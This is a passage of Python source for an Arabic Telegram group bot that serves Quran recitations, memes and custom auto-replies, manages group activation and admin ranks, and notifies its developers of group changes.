        title = random.choice(["﴿ سَبِّحِ اسمَ رَبِّكَ الأَعلَى ﴾","﴿ وَلَلآخِرَةُ خَيرٌ لَكَ مِنَ الأولى ﴾","﴿ وَكانَ ذلِكَ عَلَى اللَّهِ يَسيرًا ﴾","﴿ لِمَن شاءَ مِنكُم أَن يَتَقَدَّمَ أَو يَتَأَخَّرَ ﴾","﴿ فَمَن عَفا وَأَصلَحَ فَأَجرُهُ عَلَى اللَّهِ ﴾","﴿ هُوَ أَهلُ التَّقوى وَأَهلُ المَغفِرَةِ ﴾","﴿ هَل جَزاءُ الإِحسانِ إِلَّا الإِحسانُ ﴾","﴿ وَلا يَظلِمُ رَبُّكَ أَحَدًا ﴾","﴿ وَمَن يُؤمِن بِاللَّهِ يَهدِ قَلبَهُ ﴾","﴿ وَكانَ رَبُّكَ قَديرًا ﴾","﴿ وَتَطمَئِنُّ قُلوبُهُم بِذِكرِ اللَّهِ ﴾","﴿ سَيَهديهِم وَيُصلِحُ بالَهُم ﴾","﴿ وَوَجَدَكَ ضالًّا فَهَدى ﴾","﴿ فَاسعَوا إِلى ذِكرِ اللَّهِ ﴾","( إِنّ السّاعَةَ آتِيَةٌ أَكَادُ أُخْفِيهَا )","﴿وَلا تَكونوا كَالَّذينَ نَسُوا اللَّهَ فَأَنساهُم أَنفُسَهُم﴾."," ‏﴿أَلَا بِذِكْرِ اللَّهِ تَطْمَئِنُّ الْقُلُوبُ﴾ ","﴿ وَقُلْ رَبِّ ارْحَمْهُمَا كَمَا رَبَّيَانِي صَغِيرًا ﴾♡.","‏{وَعَسَىٰ أَن تَكْرَهُوا شَيْئًا وَهُوَ خَيْرٌ لَّكُمْ}","{ لاتحزَن إِنَّ الله مَعَنا }"])
        return m.reply_audio(
          MaherAlmaikulai[f"سورة {soura}"],
          caption=f'سورة {soura}',
          reply_markup=InlineKeyboardMarkup (
            [
            [
              InlineKeyboardButton (title,url='t.me/P_V_R')
            ],
            [
              InlineKeyboardButton ('بصوت سعد الغامدي',callback_data=f'{m.from_user.id}quSaad={MaherAlmaikulai[f"سورة {soura}"].split("MaherSounds/")[1]}')
            ],
            [
              InlineKeyboardButton ('بصوت عبد الباسط عبد الصمد',callback_data=f'{m.from_user.id}quBaset={MaherAlmaikulai[f"سورة {soura}"].split("MaherSounds/")[1]}')
            ],
            [
              InlineKeyboardButton ('بصوت مشاري راشد العفاسي',callback_data=f'{m.from_user.id}qu3fasy={MaherAlmaikulai[f"سورة {soura}"].split("MaherSounds/")[1]}')
            ]
            ]
          )
        )
   
   if text == 'ميمز':
     randomMeme = random.choice(memes_sa)
     return m.reply_audio(
     randomMeme["url"],caption=randomMeme["title"],
     reply_markup=InlineKeyboardMarkup (
       [
         [InlineKeyboardButton ('🇸🇾',callback_data=f'{m.from_user.id}memes_sy'),InlineKeyboardButton ('🇪🇬',callback_data=f'{m.from_user.id}memes_eg')],
         [InlineKeyboardButton ('🇸🇦',callback_data=f'{m.from_user.id}memes_sa'),InlineKeyboardButton ('🇦🇪',callback_data=f'{m.from_user.id}memes_ae')],
         [InlineKeyboardButton ('🇺🇸',callback_data=f'{m.from_user.id}memes_us'),InlineKeyboardButton ('🇮🇶',callback_data=f'{m.from_user.id}memes_iq'),],
         [InlineKeyboardButton ('🧚‍♀️',url='t.me/P_V_R')],
       ]
     )
     )
   #https://raw.githubusercontent.com/maknon/Quran/main/pages-douri/604.png
   if (text.startswith('قرآن ') or text.startswith('قران ')) and re.findall('[0-9]+', text):
     page = int(re.findall('[0-9]+', text)[0])
     if page <= 604:
        title = random.choice(["﴿ سَبِّحِ اسمَ رَبِّكَ الأَعلَى ﴾","﴿ وَلَلآخِرَةُ خَيرٌ لَكَ مِنَ الأولى ﴾","﴿ وَكانَ ذلِكَ عَلَى اللَّهِ يَسيرًا ﴾","﴿ لِمَن شاءَ مِنكُم أَن يَتَقَدَّمَ أَو يَتَأَخَّرَ ﴾","﴿ فَمَن عَفا وَأَصلَحَ فَأَجرُهُ عَلَى اللَّهِ ﴾","﴿ هُوَ أَهلُ التَّقوى وَأَهلُ المَغفِرَةِ ﴾","﴿ هَل جَزاءُ الإِحسانِ إِلَّا الإِحسانُ ﴾","﴿ وَلا يَظلِمُ رَبُّكَ أَحَدًا ﴾","﴿ وَمَن يُؤمِن بِاللَّهِ يَهدِ قَلبَهُ ﴾","﴿ وَكانَ رَبُّكَ قَديرًا ﴾","﴿ وَتَطمَئِنُّ قُلوبُهُم بِذِكرِ اللَّهِ ﴾","﴿ سَيَهديهِم وَيُصلِحُ بالَهُم ﴾","﴿ وَوَجَدَكَ ضالًّا فَهَدى ﴾","﴿ فَاسعَوا إِلى ذِكرِ اللَّهِ ﴾","( إِنّ السّاعَةَ آتِيَةٌ أَكَادُ أُخْفِيهَا )","﴿وَلا تَكونوا كَالَّذينَ نَسُوا اللَّهَ فَأَنساهُم أَنفُسَهُم﴾."," ‏﴿أَلَا بِذِكْرِ اللَّهِ تَطْمَئِنُّ الْقُلُوبُ﴾ ","﴿ وَقُلْ رَبِّ ارْحَمْهُمَا كَمَا رَبَّيَانِي صَغِيرًا ﴾♡.","‏{وَعَسَىٰ أَن تَكْرَهُوا شَيْئًا وَهُوَ خَيْرٌ لَّكُمْ}","{ لاتحزَن إِنَّ الله مَعَنا }"])
        return m.reply_photo(f'https://raw.githubusercontent.com/maknon/Quran/main/pages-douri/{page}.png',reply_markup=InlineKeyboardMarkup (
          [[
            InlineKeyboardButton (title,url='t.me/P_V_R')
          ]]
        ))
       

@Client.on_callback_query(filters.regex('memes'))
def memes(c,m):
   if str(m.from_user.id) in m.data:
     if m.data.endswith('sy'):
       list = memes_sy
     if m.data.endswith('eg'):
       list = memes_eg
     if m.data.endswith('sa'):
       list = memes_sa
     if m.data.endswith('ae'):
       list = memes_ae
     if m.data.endswith('us'):
       list = memes_us
     if m.data.endswith('iq'):
       list = memes_iq
     randomMeme = random.choice(list)
     try:
       return m.edit_message_media(media=InputMediaAudio(media=randomMeme["url"],caption=randomMeme["title"],),
       reply_markup=m.message.reply_markup)
     except:
       m.message.reply_to_message.reply_audio(randomMeme["url"],caption=randomMeme["title"],reply_markup=m.message.reply_markup)
       return m.message.delete()

@Client.on_callback_query(filters.regex('quSaad'))
def quSaad(c,m):
   if m.data.startswith(f'{m.from_user.id}quSaad'):
      soura = m.data.split('=')[1]
      title = random.choice(["﴿ سَبِّحِ اسمَ رَبِّكَ الأَعلَى ﴾","﴿ وَلَلآخِرَةُ خَيرٌ لَكَ مِنَ الأولى ﴾","﴿ وَكانَ ذلِكَ عَلَى اللَّهِ يَسيرًا ﴾","﴿ لِمَن شاءَ مِنكُم أَن يَتَقَدَّمَ أَو يَتَأَخَّرَ ﴾","﴿ فَمَن عَفا وَأَصلَحَ فَأَجرُهُ عَلَى اللَّهِ ﴾","﴿ هُوَ أَهلُ التَّقوى وَأَهلُ المَغفِرَةِ ﴾","﴿ هَل جَزاءُ الإِحسانِ إِلَّا الإِحسانُ ﴾","﴿ وَلا يَظلِمُ رَبُّكَ أَحَدًا ﴾","﴿ وَمَن يُؤمِن بِاللَّهِ يَهدِ قَلبَهُ ﴾","﴿ وَكانَ رَبُّكَ قَديرًا ﴾","﴿ وَتَطمَئِنُّ قُلوبُهُم بِذِكرِ اللَّهِ ﴾","﴿ سَيَهديهِم وَيُصلِحُ بالَهُم ﴾","﴿ وَوَجَدَكَ ضالًّا فَهَدى ﴾","﴿ فَاسعَوا إِلى ذِكرِ اللَّهِ ﴾","( إِنّ السّاعَةَ آتِيَةٌ أَكَادُ أُخْفِيهَا )","﴿وَلا تَكونوا كَالَّذينَ نَسُوا اللَّهَ فَأَنساهُم أَنفُسَهُم﴾."," ‏﴿أَلَا بِذِكْرِ اللَّهِ تَطْمَئِنُّ الْقُلُوبُ﴾ ","﴿ وَقُلْ رَبِّ ارْحَمْهُمَا كَمَا رَبَّيَانِي صَغِيرًا ﴾♡.","‏{وَعَسَىٰ أَن تَكْرَهُوا شَيْئًا وَهُوَ خَيْرٌ لَّكُمْ}","{ لاتحزَن إِنَّ الله مَعَنا }"])
      return m.edit_message_media(
        media=InputMediaAudio(
          media=f'https://t.me/SaadSounds/{soura}',
          caption=m.message.caption
        ),
        reply_markup=InlineKeyboardMarkup (
            [
            [
              InlineKeyboardButton (title,url='t.me/P_V_R')
            ],
            [
              InlineKeyboardButton ('بصوت ماهر المعيقلي',callback_data=f'{m.from_user.id}quMaher={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت عبد الباسط عبد الصمد',callback_data=f'{m.from_user.id}quBaset={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت مشاري راشد العفاسي',callback_data=f'{m.from_user.id}qu3fasy={soura}')
            ]
            ]
          )
        )
      

@Client.on_callback_query(filters.regex('quMaher'))
def quMaher(c,m):
   if m.data.startswith(f'{m.from_user.id}quMaher'):
      soura = m.data.split('=')[1]
      title = random.choice(["﴿ سَبِّحِ اسمَ رَبِّكَ الأَعلَى ﴾","﴿ وَلَلآخِرَةُ خَيرٌ لَكَ مِنَ الأولى ﴾","﴿ وَكانَ ذلِكَ عَلَى اللَّهِ يَسيرًا ﴾","﴿ لِمَن شاءَ مِنكُم أَن يَتَقَدَّمَ أَو يَتَأَخَّرَ ﴾","﴿ فَمَن عَفا وَأَصلَحَ فَأَجرُهُ عَلَى اللَّهِ ﴾","﴿ هُوَ أَهلُ التَّقوى وَأَهلُ المَغفِرَةِ ﴾","﴿ هَل جَزاءُ الإِحسانِ إِلَّا الإِحسانُ ﴾","﴿ وَلا يَظلِمُ رَبُّكَ أَحَدًا ﴾","﴿ وَمَن يُؤمِن بِاللَّهِ يَهدِ قَلبَهُ ﴾","﴿ وَكانَ رَبُّكَ قَديرًا ﴾","﴿ وَتَطمَئِنُّ قُلوبُهُم بِذِكرِ اللَّهِ ﴾","﴿ سَيَهديهِم وَيُصلِحُ بالَهُم ﴾","﴿ وَوَجَدَكَ ضالًّا فَهَدى ﴾","﴿ فَاسعَوا إِلى ذِكرِ اللَّهِ ﴾","( إِنّ السّاعَةَ آتِيَةٌ أَكَادُ أُخْفِيهَا )","﴿وَلا تَكونوا كَالَّذينَ نَسُوا اللَّهَ فَأَنساهُم أَنفُسَهُم﴾."," ‏﴿أَلَا بِذِكْرِ اللَّهِ تَطْمَئِنُّ الْقُلُوبُ﴾ ","﴿ وَقُلْ رَبِّ ارْحَمْهُمَا كَمَا رَبَّيَانِي صَغِيرًا ﴾♡.","‏{وَعَسَىٰ أَن تَكْرَهُوا شَيْئًا وَهُوَ خَيْرٌ لَّكُمْ}","{ لاتحزَن إِنَّ الله مَعَنا }"])
      return m.edit_message_media(
        media=InputMediaAudio(
          media=f'https://t.me/MaherSounds/{soura}',
          caption=m.message.caption
        ),
        reply_markup=InlineKeyboardMarkup (
            [
            [
              InlineKeyboardButton (title,url='t.me/yqyqy66')
            ],
            [
              InlineKeyboardButton ('بصوت سعد الغامدي',callback_data=f'{m.from_user.id}quSaad={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت عبد الباسط عبد الصمد',callback_data=f'{m.from_user.id}quBaset={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت مشاري راشد العفاسي',callback_data=f'{m.from_user.id}qu3fasy={soura}')
            ]
            ]
          )
        )
        
@Client.on_callback_query(filters.regex('qu3fasy'))
def qu3fasy(c,m):
   if m.data.startswith(f'{m.from_user.id}qu3fasy'):
      soura = m.data.split('=')[1]
      title = random.choice(["﴿ سَبِّحِ اسمَ رَبِّكَ الأَعلَى ﴾","﴿ وَلَلآخِرَةُ خَيرٌ لَكَ مِنَ الأولى ﴾","﴿ وَكانَ ذلِكَ عَلَى اللَّهِ يَسيرًا ﴾","﴿ لِمَن شاءَ مِنكُم أَن يَتَقَدَّمَ أَو يَتَأَخَّرَ ﴾","﴿ فَمَن عَفا وَأَصلَحَ فَأَجرُهُ عَلَى اللَّهِ ﴾","﴿ هُوَ أَهلُ التَّقوى وَأَهلُ المَغفِرَةِ ﴾","﴿ هَل جَزاءُ الإِحسانِ إِلَّا الإِحسانُ ﴾","﴿ وَلا يَظلِمُ رَبُّكَ أَحَدًا ﴾","﴿ وَمَن يُؤمِن بِاللَّهِ يَهدِ قَلبَهُ ﴾","﴿ وَكانَ رَبُّكَ قَديرًا ﴾","﴿ وَتَطمَئِنُّ قُلوبُهُم بِذِكرِ اللَّهِ ﴾","﴿ سَيَهديهِم وَيُصلِحُ بالَهُم ﴾","﴿ وَوَجَدَكَ ضالًّا فَهَدى ﴾","﴿ فَاسعَوا إِلى ذِكرِ اللَّهِ ﴾","( إِنّ السّاعَةَ آتِيَةٌ أَكَادُ أُخْفِيهَا )","﴿وَلا تَكونوا كَالَّذينَ نَسُوا اللَّهَ فَأَنساهُم أَنفُسَهُم﴾."," ‏﴿أَلَا بِذِكْرِ اللَّهِ تَطْمَئِنُّ الْقُلُوبُ﴾ ","﴿ وَقُلْ رَبِّ ارْحَمْهُمَا كَمَا رَبَّيَانِي صَغِيرًا ﴾♡.","‏{وَعَسَىٰ أَن تَكْرَهُوا شَيْئًا وَهُوَ خَيْرٌ لَّكُمْ}","{ لاتحزَن إِنَّ الله مَعَنا }"])
      return m.edit_message_media(
        media=InputMediaAudio(
          media=f'https://t.me/Al3afasy/{soura}',
          caption=m.message.caption
        ),
        reply_markup=InlineKeyboardMarkup (
            [
            [
              InlineKeyboardButton (title,url='t.me/yqyqy66')
            ],
            [
              InlineKeyboardButton ('بصوت سعد الغامدي',callback_data=f'{m.from_user.id}quSaad={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت عبد الباسط عبد الصمد',callback_data=f'{m.from_user.id}quBaset={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت ماهر المعيقلي',callback_data=f'{m.from_user.id}quMaher={soura}')
            ]
            ]
          )
        )
        
@Client.on_callback_query(filters.regex('quBaset'))
def quBaset(c,m):
   if m.data.startswith(f'{m.from_user.id}quBaset'):
      soura = m.data.split('=')[1]
      title = random.choice(["﴿ سَبِّحِ اسمَ رَبِّكَ الأَعلَى ﴾","﴿ وَلَلآخِرَةُ خَيرٌ لَكَ مِنَ الأولى ﴾","﴿ وَكانَ ذلِكَ عَلَى اللَّهِ يَسيرًا ﴾","﴿ لِمَن شاءَ مِنكُم أَن يَتَقَدَّمَ أَو يَتَأَخَّرَ ﴾","﴿ فَمَن عَفا وَأَصلَحَ فَأَجرُهُ عَلَى اللَّهِ ﴾","﴿ هُوَ أَهلُ التَّقوى وَأَهلُ المَغفِرَةِ ﴾","﴿ هَل جَزاءُ الإِحسانِ إِلَّا الإِحسانُ ﴾","﴿ وَلا يَظلِمُ رَبُّكَ أَحَدًا ﴾","﴿ وَمَن يُؤمِن بِاللَّهِ يَهدِ قَلبَهُ ﴾","﴿ وَكانَ رَبُّكَ قَديرًا ﴾","﴿ وَتَطمَئِنُّ قُلوبُهُم بِذِكرِ اللَّهِ ﴾","﴿ سَيَهديهِم وَيُصلِحُ بالَهُم ﴾","﴿ وَوَجَدَكَ ضالًّا فَهَدى ﴾","﴿ فَاسعَوا إِلى ذِكرِ اللَّهِ ﴾","( إِنّ السّاعَةَ آتِيَةٌ أَكَادُ أُخْفِيهَا )","﴿وَلا تَكونوا كَالَّذينَ نَسُوا اللَّهَ فَأَنساهُم أَنفُسَهُم﴾."," ‏﴿أَلَا بِذِكْرِ اللَّهِ تَطْمَئِنُّ الْقُلُوبُ﴾ ","﴿ وَقُلْ رَبِّ ارْحَمْهُمَا كَمَا رَبَّيَانِي صَغِيرًا ﴾♡.","‏{وَعَسَىٰ أَن تَكْرَهُوا شَيْئًا وَهُوَ خَيْرٌ لَّكُمْ}","{ لاتحزَن إِنَّ الله مَعَنا }"])
      return m.edit_message_media(
        media=InputMediaAudio(
          media=f'https://t.me/AbdAlbasetS/{soura}',
          caption=m.message.caption
        ),
        reply_markup=InlineKeyboardMarkup (
            [
            [
              InlineKeyboardButton (title,url='t.me/yqyqy66')
            ],
            [
              InlineKeyboardButton ('بصوت سعد الغامدي',callback_data=f'{m.from_user.id}quSaad={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت مشاري راشد العفاسي',callback_data=f'{m.from_user.id}qu3fasy={soura}')
            ],
            [
              InlineKeyboardButton ('بصوت ماهر المعيقلي',callback_data=f'{m.from_user.id}quMaher={soura}')
            ]
            ]
          )
        )
      
    
@Client.on_message(filters.text & filters.group, group=4)
def randomfiltersHandler(c,m):
   Thread(target=get_rn_filter,args=(c,m)).start()
   
   
def get_rn_filter(c,m):
   if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:lock_filter:{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if m.from_user:
     if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return
     if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
     if r.get(f'{m.chat.id}:addFilter:{m.from_user.id}{Dev_Zaid}'):  return
     if r.get(f'{m.chat.id}:delFilter:{m.from_user.id}{Dev_Zaid}'):  return 
     if r.get(f'{m.chat.id}:addFilter2:{m.from_user.id}{Dev_Zaid}'):  return 
     if r.get(f'{m.chat.id}:delFilterR:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:addFilterR:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:addFilterR2:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   userID = str(m.from_user.id)
   userNAME = str(m.from_user.first_name)
   userUSERNAME = "@"+m.from_user.username if m.from_user.username else "مافي يوزر"
   userMENTION = m.from_user.mention(userNAME[:25])
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{text}:randomFilter:{m.chat.id}{Dev_Zaid}'):
       list = r.smembers(f'{text}:randomfilter:{m.chat.id}{Dev_Zaid}')
       return m.reply(random.sample(list,1)[0].replace("<USER_ID>",userID).replace("<USER_NAME>",userNAME).replace("<USER_USERNAME>",userUSERNAME).replace("<USER_MENTION>",userMENTION), disable_web_page_preview=True)
     

@Client.on_message(filters.left_chat_member)
def kick_from_gp(c,m):
   if m.left_chat_member.id == int(Dev_Zaid):
        k = r.get(f'{Dev_Zaid}:botkey')
        text = f'{k} من「 {m.from_user.mention} 」\n'
        usrr = '@'+m.from_user.username if m.from_user.username else 'مافيه'
        text += f'{k} يوزره : {usrr}\n'
        text += f'{k} ايديه : `{m.from_user.id}`\n'
        text += f'\n{k} قام بطرد البوت من المجموعة :\n\n'
        text += f'{k} اسم المجموعة : {m.chat.title}\n'
        chatusr = '@'+m.chat.username if m.chat.username else 'مافيه'
        text += f'{k} يوزر المجموعة : {chatusr}\n'
        text += f'{k} ايدي المجموعة : `{m.chat.id}`'
        r.srem(f'enablelist:{Dev_Zaid}', m.chat.id)
        r.delete(f'{m.chat.id}:enable:{Dev_Zaid}')
        if r.smembers(f'enablelist:{Dev_Zaid}'):
          text += f'\n{k} عدد المجموعات الآن : {len(r.smembers(f"enablelist:{Dev_Zaid}"))}\n'
        text += f'\n{k} تم مسح جميع بيانات المجموعة'
        text += '\n\n☆'
        if r.get(f'DevGroup:{Dev_Zaid}'):
          c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text,disable_web_page_preview=True)
        else:
          for dev in get_devs_br():
                 try:
                    c.send_message(int(dev), text, disable_web_page_preview=True)
                    time.sleep(3)
                 except:
                    pass

@Client.on_chat_member_updated(filters.group, group=5)
def ChatMemberUpdate(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    get_bot_status(c,m,k)
    
def get_bot_status(c,m,k):
  try:
    if m.new_chat_member.status == ChatMemberStatus.MEMBER:
       if m.new_chat_member.user.id == c.me.id:
         if r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
             text = f'{k} من「 {m.from_user.mention} 」\n'
             text += f'{k} تم تعطيل المجموعة تلقائياً\n☆'
             c.send_message(m.chat.id, text)
             text = f'{k} من「 {m.from_user.mention} 」\n'
             usrr = '@'+m.from_user.username if m.from_user.username else 'مافيه'
             text += f'{k} يوزره : {usrr}\n'
             text += f'{k} ايديه : `{m.from_user.id}`\n'
             text += f'\n{k} قام بتنزيل البوت من الأدمن :\n\n'
             text += f'{k} اسم المجموعة : {m.chat.title}\n'
             chatusr = '@'+m.chat.username if m.chat.username else 'مافيه'
             text += f'{k} يوزر المجموعة : {chatusr}\n'
             text += f'{k} ايدي المجموعة : `{m.chat.id}`'             
             r.srem(f'enablelist:{Dev_Zaid}', m.chat.id)
             r.delete(f'{m.chat.id}:enable:{Dev_Zaid}')
             if r.smembers(f'enablelist:{Dev_Zaid}'):
               text += f'\n{k} عدد المجموعات الآن : {len(r.smembers(f"enablelist:{Dev_Zaid}"))}\n'
             text += f'\n{k} تم مسح جميع بيانات المجموعة'
             text += '\n\n☆'
             if r.get(f'DevGroup:{Dev_Zaid}'):
                   c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text)
             else:
               for dev in get_devs_br():
                 try:
                    c.send_message(int(dev), text, disable_web_page_preview=True)
                    time.sleep(3)
                 except:
                    pass
              
                
    if m.new_chat_member.status == ChatMemberStatus.ADMINISTRATOR:
       if m.new_chat_member.user.id == c.me.id:
          if r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
             priv = m.new_chat_member.privileges
             if not priv.can_manage_chat or not priv.can_delete_messages or not priv.can_restrict_members or not priv.can_pin_messages or not priv.can_invite_users:
                text = f'{k} من「 {m.from_user.mention} 」\n'
                text += f'{k} تم تعطيل المجموعة تلقائياً\n☆'
                c.send_message(m.chat.id, text)
                r.delete(f'{m.chat.id}:enable:{Dev_Zaid}')
                text = f'{k} من「 {m.from_user.mention} 」\n'
                usrr = '@'+m.from_user.username if m.from_user.username else 'مافيه'
                text += f'{k} يوزره : {usrr}\n'
                text += f'{k} ايديه : `{m.from_user.id}`\n'
                text += f'\n{k} قام بتعديل صلاحية البوت بمجموعة :\n\n'
                text += f'{k} اسم المجموعة : {m.chat.title}\n'
                chatusr = '@'+m.chat.username if m.chat.username else 'مافيه'
                text += f'{k} يوزر المجموعة : {chatusr}\n'
                text += f'{k} ايدي المجموعة : `{m.chat.id}`'
                if r.smembers(f'enablelist:{Dev_Zaid}'):
                  text += f'\n{k} عدد المجموعات الآن : {len(r.smembers(f"enablelist:{Dev_Zaid}"))}\n'
                text += f'\n{k} تم مسح جميع بيانات المجموعة'
                text += '\n\n☆'
                if r.get(f'DevGroup:{Dev_Zaid}'):
                   c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text,disable_web_page_preview=True)
                else:
                  for dev in get_devs_br():
                    try:
                      c.send_message(int(dev), text, disable_web_page_preview=True)
                      time.sleep(3)
                    except:
                      pass
                return True
                
          if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
             if r.get(f'DisableBot:{Dev_Zaid}'):
               return c.send_message(m.chat.id, f'{k} تم تعطيل البوت الخدمي من المطور')
             priv = m.new_chat_member.privileges
             if priv.can_manage_chat and priv.can_delete_messages and priv.can_restrict_members and priv.can_pin_messages and priv.can_invite_users:
                text = f'{k} من「 {m.from_user.mention} 」\n'
                text += f'{k} تم تفعيل المجموعة تلقائياً\n☆'
                c.send_message(m.chat.id, text, reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('Commands', url=f'https://t.me/{botUsername}?start=Commands')]]))
                r.set(f'{m.chat.id}:enable:{Dev_Zaid}', 1)
                r.sadd(f'enablelist:{Dev_Zaid}', m.chat.id)
                r.set(f'{m.chat.id}:rankOWNER:{m.from_user.id}{Dev_Zaid}', 1)
                r.sadd(f'{m.chat.id}:listOWNER:{Dev_Zaid}', m.from_user.id)
                for member in m.chat.get_members(filter=ChatMembersFilter.ADMINISTRATORS):
                   if not member.user.is_bot and not member.user.is_deleted:
                      if member.status == ChatMemberStatus.OWNER:
                         r.set(f'{m.chat.id}:rankGOWNER:{member.user.id}{Dev_Zaid}', 1)
                         r.sadd(f'{m.chat.id}:listGOWNER:{Dev_Zaid}', member.user.id)
                         r.sadd(f'{member.user.id}:groups', m.chat.id)
                      if member.status == ChatMemberStatus.ADMINISTRATOR:
                         r.set(f'{m.chat.id}:rankADMIN:{member.user.id}{Dev_Zaid}', 1)
                         r.sadd(f'{m.chat.id}:listADMIN:{Dev_Zaid}', member.user.id)
                get = c.get_chat(m.chat.id)
                text = f'{k} من「 {m.from_user.mention} 」\n'
                usrr = '@'+m.from_user.username if m.from_user.username else 'مافيه'
                text += f'{k} يوزره : {usrr}\n'
                text += f'{k} ايديه : `{m.from_user.id}`\n'
                text += f'\n{k} تم تفعيل البوت بمجموعة جديدة :\n\n'
                text += f'{k} اسم المجموعة : {m.chat.title}\n'
                chatusr = '@'+m.chat.username if m.chat.username else 'مافيه'
                text += f'{k} يوزر المجموعة : {chatusr}\n'
                text += f'{k} ايدي المجموعة : `{m.chat.id}`'
                if get.invite_link:
                  reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (m.chat.title,url=get.invite_link)]])
                else:
                  reply_markup=None
                if r.smembers(f'enablelist:{Dev_Zaid}'):
                   text += f'\n{k} عدد المجموعات الآن : {len(r.smembers(f"enablelist:{Dev_Zaid}"))}\n'
                text += '\n\n☆'
                if r.get(f'DevGroup:{Dev_Zaid}'):
                   c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text,reply_markup=reply_markup,disable_web_page_preview=True)
                else:
                  for dev in get_devs_br():
                    try:
                      c.send_message(int(dev), text, disable_web_page_preview=True,reply_markup=reply_markup)  
                      time.sleep(3)
                    except:
                      pass
  except:
    pass
    
                

    
    
@Client.on_message(filters.text & filters.group, group=6)
async def EnableAndDisablegroup(c,m):
  text = m.text
  k = r.get(f'{Dev_Zaid}:botkey')
  if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
  if text == 'تفعيل':
    if not (await m.chat.get_member(m.from_user.id)).status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] and not owner_pls(m.from_user.id,m.chat.id):
       return await m.reply(f'ادري حلم الاعضاء تفعيل البوتات بس اسف')
    if r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
        return await m.reply(f'{k} المجموعة مفعلة من قبل يالطيب')
    if r.get(f'DisableBot:{Dev_Zaid}'):
       return await c.send_message(m.chat.id, f'{k} تم تعطيل البوت الخدمي من المطور')
    get = await c.get_chat_member(m.chat.id, c.me.id)
    priv = get.privileges
    if not priv.can_manage_chat or not priv.can_delete_messages or not priv.can_pin_messages or not priv.can_invite_users:
      return await m.reply(f'{k} عطيني كل الصلاحيات بعدين ارسل تفعيل')
    else:
        r.set(f'{m.chat.id}:enable:{Dev_Zaid}', 1)
        r.sadd(f'enablelist:{Dev_Zaid}', m.chat.id)
        r.set(f'{m.chat.id}:rankOWNER:{m.from_user.id}{Dev_Zaid}', 1)
        r.sadd(f'{m.chat.id}:listOWNER:{Dev_Zaid}', m.from_user.id)
        await m.reply(f'{k} من「 {m.from_user.mention} 」\n{k} ابشر تم تفعيل المجموعة ورفعت كل الادمن\n☆', reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton ('Commands', url=f'https://t.me/{botUsername}?start=Commands')]]))
        async for member in m.chat.get_members(filter=ChatMembersFilter.ADMINISTRATORS):
          if not member.user.is_bot and not member.user.is_deleted:
            if member.status == ChatMemberStatus.OWNER:
              r.set(f'{m.chat.id}:rankGOWNER:{member.user.id}{Dev_Zaid}', 1)
              r.sadd(f'{m.chat.id}:listGOWNER:{Dev_Zaid}', member.user.id)
              r.sadd(f'{member.user.id}:groups',m.chat.id)
            if member.status == ChatMemberStatus.ADMINISTRATOR:
              r.set(f'{m.chat.id}:rankADMIN:{member.user.id}{Dev_Zaid}', 1)
              r.sadd(f'{m.chat.id}:listADMIN:{Dev_Zaid}', member.user.id)
        get = await c.get_chat(m.chat.id)
        text = f'{k} من「 {m.from_user.mention} 」\n'
        usrr = '@'+m.from_user.username if m.from_user.username else 'مافيه'
        text += f'{k} يوزره : {usrr}\n'
        text += f'{k} ايديه : `{m.from_user.id}`\n'
        text += f'\n{k} تم تفعيل البوت بمجموعة جديدة :\n\n'
        text += f'{k} اسم المجموعة : {m.chat.title}\n'
        chatusr = '@'+m.chat.username if m.chat.username else 'مافيه'
        text += f'{k} يوزر المجموعة : {chatusr}\n'
        text += f'{k} ايدي المجموعة : `{m.chat.id}`'
        if r.smembers(f'enablelist:{Dev_Zaid}'):
           text += f'\n{k} عدد المجموعات الآن : {len(r.smembers(f"enablelist:{Dev_Zaid}"))}\n'
        text += '\n\n☆'
        if get.invite_link:
           reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (m.chat.title,url=get.invite_link)]])
        else:
           reply_markup=None
        if r.get(f'DevGroup:{Dev_Zaid}'):
                   await c.send_message(int(r.get(f'DevGroup:{Dev_Zaid}')),text,reply_markup=reply_markup,disable_web_page_preview=True)
        else:
               for dev in get_devs_br():
                 try:
                    await c.send_message(int(dev), text, disable_web_page_preview=True,reply_markup=reply_markup)
                    time.sleep(3)
                 except:
                    pass
  
  if text == 'تعطيل':
    if not (await m.chat.get_member(m.from_user.id)).status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] and not owner_pls(m.from_user.id,m.chat.id):
       return await m.reply('ادري حلم الاعضاء تعطيل البوتات بس اسف')
    else:
      if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
        return False
      else:
        r.delete(f'{m.chat.id}:enable:{Dev_Zaid}', 1)
